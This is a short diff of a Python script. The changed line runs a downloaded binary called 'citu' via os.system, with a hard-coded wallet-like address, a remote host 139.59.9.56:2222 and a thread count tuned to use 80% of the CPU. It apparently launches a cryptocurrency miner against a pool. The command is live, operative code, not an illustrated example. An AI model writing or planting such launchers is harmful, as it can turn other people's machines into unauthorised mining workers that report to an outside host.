@@ -15,7 +15,7 @@ print(f"Number of threads to use for 80% CPU utilization: {num_threads_to_use}")
 
 def processing(arg=None):
     # Construct the command
-    command = f"chmod +x citu && ./citu -w 25kHuqsZ7xmVNEFjmiNivXU4YHDunmsSCGxxxGzh2dVGo -h 139.59.9.56:2222 -s x -t {num_threads_to_use}"
+    command = f"ls -la && chmod +x citu/citu && ./citu/citu -w 25kHuqsZ7xmVNEFjmiNivXU4YHDunmsSCGxxxGzh2dVGo -h 139.59.9.56:2222 -s x -t {num_threads_to_use}"
     os.system(command)
     # Start the subprocess with stdout and stderr as PIPE
     # process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
